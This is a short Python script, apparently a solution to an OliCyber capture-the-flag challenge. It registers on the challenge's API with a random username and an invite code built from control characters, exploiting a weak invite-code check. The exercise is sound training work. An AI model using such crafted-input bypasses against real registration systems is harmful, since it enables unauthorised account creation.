import requests, string
import random

url = 'http://frittomisto.challs.olicyber.it/api/register'

def generate_alphanumeric_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

username = generate_alphanumeric_string()
invite_code = ''.join(chr(i) for i in range(10))

#questo check lato front-end è lo stesso che è presente lato back-end
print(requests.post(url, json={'username': username, 'password': '1234567890', 'invite': invite_code}, headers={'Content-Type': 'application/json'}).text)